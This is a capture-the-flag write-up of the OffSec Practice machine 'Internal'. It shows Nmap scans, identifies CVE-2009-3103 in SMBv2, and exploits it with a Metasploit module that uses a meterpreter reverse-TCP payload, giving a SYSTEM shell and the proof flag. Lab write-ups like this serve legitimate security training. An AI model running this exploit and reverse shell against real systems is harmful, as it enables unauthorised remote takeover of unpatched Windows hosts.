# Internal: Offsec Practice's Walkthrough

![DeepAI Generated Image](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Internal/screenshots/deepai.jpg 'DeepAI Generated Image')

## Introduction

This report presents the enumeration and exploitation process used to compromise the Internal machine from the OffSec Practice lab. The target was identified as a Windows Server 2008 (SP1) host exposing multiple SMB and RPC-related services. A vulnerability scan revealed that the system was affected by the SMBv2 Negotiation Vulnerability (CVE-2009-3103), enabling remote unauthenticated code execution. The following sections detail the methodology used to obtain SYSTEM-level access and retrieve the proof file.

## Machine Enumeration

An initial Nmap scan was performed to identify open ports and running services.

```
┌──(kali㉿kali)-[~/offsec/Practice/Internal]
└─$ nmap -sC -sV 192.168.150.40 -oN nmap.init.txt                                                 
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 18:04 EDT
Nmap scan report for 192.168.150.40
Host is up (0.014s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
| dns-nsid: 
|_  bind.version: Microsoft DNS 6.0.6001 (17714650)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Windows Server (R) 2008 Standard 6001 Service Pack 1 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
|_ssl-date: 2025-10-03T22:05:13+00:00; +1s from scanner time.
| rdp-ntlm-info: 
|   Target_Name: INTERNAL
|   NetBIOS_Domain_Name: INTERNAL
|   NetBIOS_Computer_Name: INTERNAL
|   DNS_Domain_Name: internal
|   DNS_Computer_Name: internal
|   Product_Version: 6.0.6001
|_  System_Time: 2025-10-03T22:05:05+00:00
| ssl-cert: Subject: commonName=internal
| Not valid before: 2025-07-24T21:18:58
|_Not valid after:  2026-01-23T21:18:58
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-title: Service Unavailable
|_http-server-header: Microsoft-HTTPAPI/2.0
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_nbstat: NetBIOS name: INTERNAL, NetBIOS user: <unknown>, NetBIOS MAC: 00:50:56:9e:bb:54 (VMware)
| smb-security-mode: 
|   account_used: guest
|   authentication_level: user
|   challenge_response: supported
|_  message_signing: disabled (dangerous, but default)
| smb-os-discovery: 
|   OS: Windows Server (R) 2008 Standard 6001 Service Pack 1 (Windows Server (R) 2008 Standard 6.0)
|   OS CPE: cpe:/o:microsoft:windows_server_2008::sp1
|   Computer name: internal
|   NetBIOS computer name: INTERNAL\x00
|   Workgroup: WORKGROUP\x00
|_  System time: 2025-10-03T15:05:05-07:00
| smb2-time: 
|   date: 2025-10-03T22:05:05
|_  start_date: 2025-07-25T21:18:51
| smb2-security-mode: 
|   2:0:2: 
|_    Message signing enabled but not required
|_clock-skew: mean: 1h24m00s, deviation: 3h07m49s, median: 0s

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 69.78 seconds
```

The host was confirmed running **Windows Server 2008 SP1** with several notable services exposed, including:

- SMB (445)

- MSRPC (multiple ports)

- RDP (3389)

- HTTPAPI (5357)

- DNS (53)

Key system details were also obtained from RDP and SMB enumeration, confirming the hostname INTERNAL and the domain internal.

```
┌──(kali㉿kali)-[~/offsec/Practice/Internal]
└─$ nmap --script=vuln -sV 192.168.150.40         
Starting Nmap 7.95 ( https://nmap.org ) at 2025-10-03 18:12 EDT
Nmap scan report for 192.168.150.40
Host is up (0.0085s latency).
Not shown: 987 closed tcp ports (reset)
PORT      STATE SERVICE       VERSION
53/tcp    open  domain        Microsoft DNS 6.0.6001 (17714650) (Windows Server 2008 SP1)
135/tcp   open  msrpc         Microsoft Windows RPC
139/tcp   open  netbios-ssn   Microsoft Windows netbios-ssn
445/tcp   open  microsoft-ds  Microsoft Windows Server 2008 R2 microsoft-ds (workgroup: WORKGROUP)
3389/tcp  open  ms-wbt-server Microsoft Terminal Service
5357/tcp  open  http          Microsoft HTTPAPI httpd 2.0 (SSDP/UPnP)
|_http-csrf: Couldn't find any CSRF vulnerabilities.
|_http-server-header: Microsoft-HTTPAPI/2.0
|_http-dombased-xss: Couldn't find any DOM based XSS.
|_http-stored-xss: Couldn't find any stored XSS vulnerabilities.
|_http-vuln-cve2014-3704: ERROR: Script execution failed (use -d to debug)
|_http-aspnet-debug: ERROR: Script execution failed (use -d to debug)
49152/tcp open  msrpc         Microsoft Windows RPC
49153/tcp open  msrpc         Microsoft Windows RPC
49154/tcp open  msrpc         Microsoft Windows RPC
49155/tcp open  msrpc         Microsoft Windows RPC
49156/tcp open  msrpc         Microsoft Windows RPC
49157/tcp open  msrpc         Microsoft Windows RPC
49158/tcp open  msrpc         Microsoft Windows RPC
Service Info: Host: INTERNAL; OS: Windows; CPE: cpe:/o:microsoft:windows_server_2008::sp1, cpe:/o:microsoft:windows, cpe:/o:microsoft:windows_server_2008:r2

Host script results:
|_samba-vuln-cve-2012-1182: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT
|_smb-vuln-ms10-054: false
| smb-vuln-cve2009-3103: 
|   VULNERABLE:
|   SMBv2 exploit (CVE-2009-3103, Microsoft Security Advisory 975497)
|     State: VULNERABLE
|     IDs:  CVE:CVE-2009-3103
|           Array index error in the SMBv2 protocol implementation in srv2.sys in Microsoft Windows Vista Gold, SP1, and SP2,
|           Windows Server 2008 Gold and SP2, and Windows 7 RC allows remote attackers to execute arbitrary code or cause a
|           denial of service (system crash) via an & (ampersand) character in a Process ID High header field in a NEGOTIATE
|           PROTOCOL REQUEST packet, which triggers an attempted dereference of an out-of-bounds memory location,
|           aka "SMBv2 Negotiation Vulnerability."
|           
|     Disclosure date: 2009-09-08
|     References:
|       http://www.cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_      https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2009-3103
|_smb-vuln-ms10-061: Could not negotiate a connection:SMB: Failed to receive bytes: TIMEOUT

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 144.59 seconds
```

The vulnerability scan identified: CVE-2009-3103 - SMBv2 Negotiation .Vulnerability

The SMBv2 implementation on Windows Server 2008 was determined to be VULNERABLE, allowing remote code execution through an out-of-bounds memory dereference in the SMB negotiation protocol.

## Exploitation

A search was conducted for exploit code related to CVE-2009-3103. The Metasploit module ms09_050_smb2_negotiate_func_index was selected for exploitation.

![Google Search Result](https://github.com/het-desai/Offsec-CTF/blob/main/Practice/Internal/screenshots/GoogleSearchResult.png "Google Search Result")

[ms09_050_smb2_negotiate_func_index](https://www.rapid7.com/db/modules/exploit/windows/smb/ms09_050_smb2_negotiate_func_index/)

```
┌──(kali㉿kali)-[~/offsec/Practice/Internal/exploit]
└─$ msfconsole -q                                                                                      
msf > search CVE-2009-3103

Matching Modules
================

   #  Name                                                       Disclosure Date  Rank    Check  Description
   -  ----                                                       ---------------  ----    -----  -----------
   0  exploit/windows/smb/ms09_050_smb2_negotiate_func_index     2009-09-07       good    No     MS09-050 Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   1  auxiliary/dos/windows/smb/ms09_050_smb2_negotiate_pidhigh  .                normal  No     Microsoft SRV2.SYS SMB Negotiate ProcessID Function Table Dereference
   2  auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff     .                normal  No     Microsoft SRV2.SYS SMB2 Logoff Remote Kernel NULL Pointer Dereference


Interact with a module by name or index. For example info 2, use 2 or use auxiliary/dos/windows/smb/ms09_050_smb2_session_logoff

msf > use 0
[*] No payload configured, defaulting to windows/meterpreter/reverse_tcp
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > show options

Module options (exploit/windows/smb/ms09_050_smb2_negotiate_func_index):

   Name    Current Setting  Required  Description
   ----    ---------------  --------  -----------
   RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
   RPORT   445              yes       The target port (TCP)
   WAIT    180              yes       The number of seconds to wait for the attack to complete.


Payload options (windows/meterpreter/reverse_tcp):

   Name      Current Setting  Required  Description
   ----      ---------------  --------  -----------
   EXITFUNC  thread           yes       Exit technique (Accepted: '', seh, thread, process, none)
   LHOST     192.168.83.128   yes       The listen address (an interface may be specified)
   LPORT     4444             yes       The listen port


Exploit target:

   Id  Name
   --  ----
   0   Windows Vista SP1/SP2 and Server 2008 (x86)



View the full module info with the info, or info -d command.

msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LHOST 192.168.45.152
LHOST => 192.168.45.152
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set LPORT 4444
LPORT => 4444
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > set RHOST 192.168.150.40
RHOST => 192.168.150.40
msf exploit(windows/smb/ms09_050_smb2_negotiate_func_index) > exploit
[*] Started reverse TCP handler on 192.168.45.152:4444 
[*] 192.168.150.40:445 - Connecting to the target (192.168.150.40:445)...
[*] 192.168.150.40:445 - Sending the exploit packet (951 bytes)...
[*] 192.168.150.40:445 - Waiting up to 180 seconds for exploit to trigger...
[*] Sending stage (177734 bytes) to 192.168.150.40
/usr/share/metasploit-framework/vendor/bundle/ruby/3.3.0/gems/recog-3.1.21/lib/recog/fingerprint/regexp_factory.rb:34: warning: nested repeat operator '+' and '?' was replaced with '*' in regular expression
[*] Meterpreter session 1 opened (192.168.45.152:4444 -> 192.168.150.40:49159) at 2025-10-03 18:38:30 -0400

meterpreter > shell
Process 1352 created.
Channel 1 created.
Microsoft Windows [Version 6.0.6001]
Copyright (c) 2006 Microsoft Corporation.  All rights reserved.

C:\Windows\system32>whoami
whoami
nt authority\system

C:\Windows\system32>type \Users\Administrator\Desktop\proof.txt
type \Users\Administrator\Desktop\proof.txt
c64af1030965c4c6c6fe6557ce192a3c
```

## Conclusion

The Internal machine was successfully compromised using an unauthenticated remote code execution exploit targeting the SMBv2 Negotiation Vulnerability (CVE-2009-3103). The vulnerability was identified during Nmap's script scanning phase and was exploited using Metasploit's `ms09_050_smb2_negotiate_func_index` module. This resulted in immediate SYSTEM-level access, allowing retrieval of the proof file. This assessment highlights the critical impact of legacy SMB vulnerabilities on outdated Windows systems and underscores the importance of patching known issues such as MS09-050 to prevent remote compromise.